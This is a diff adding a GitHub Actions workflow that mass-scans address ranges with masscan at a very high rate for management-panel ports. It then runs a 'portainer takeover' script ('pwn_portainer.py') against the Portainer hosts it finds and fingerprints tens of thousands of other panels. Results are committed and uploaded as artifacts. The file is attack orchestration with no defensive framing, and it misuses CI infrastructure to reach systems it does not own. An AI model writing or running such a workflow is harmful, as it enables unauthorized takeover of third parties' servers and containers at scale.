@@ -1,0 +1,47 @@
+name: panels2
+on: workflow_dispatch
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    timeout-minutes: 340
+    steps:
+      - uses: actions/checkout@v4
+      - run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq masscan
+          pip install -q requests
+      - name: masscan panels
+        run: |
+          sudo masscan -iL cidrs.txt -p9000,9443,2030,2031,8888,8443 --rate 100000 -oL pn.txt --wait 0 || true
+          awk '$1=="open"{print $4":"$3}' pn.txt | sort -u > pn_hosts.txt
+          echo "=== panel ports open: $(wc -l < pn_hosts.txt) ==="
+          awk -F: '{print $2}' pn_hosts.txt | sort | uniq -c
+      - name: portainer takeover
+        run: |
+          grep -E ':(9000|9443)$' pn_hosts.txt > pt_hosts.txt || true
+          echo "portainer candidates: $(wc -l < pt_hosts.txt)"
+          python3 pwn_portainer.py pt_hosts.txt || true
+      - name: webmin/panel fingerprint on others
+        run: |
+          grep -vE ':(9000|9443)$' pn_hosts.txt > other_hosts.txt || true
+          head -40000 other_hosts.txt > other_sample.txt || true
+          python3 vps_panel.py other_sample.txt || true
+      - name: persist
+        if: always()
+        run: |
+          cp /tmp/portainer_result.json portainer_result.json 2>/dev/null || echo '{}' > portainer_result.json
+          cp /tmp/vps_panel_result.json panel_result.json 2>/dev/null || echo '{}' > panel_result.json
+          cp pn_hosts.txt pn_hosts.txt
+          git config user.email kops@local; git config user.name kops
+          git add portainer_result.json panel_result.json pn_hosts.txt 2>/dev/null || true
+          git commit -m "panels2 $(date -u +%s)" 2>/dev/null || true
+          git push 2>/dev/null || true
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: panels2
+          path: |
+            portainer_result.json
+            panel_result.json
+            pn_hosts.txt
+          if-no-files-found: warn
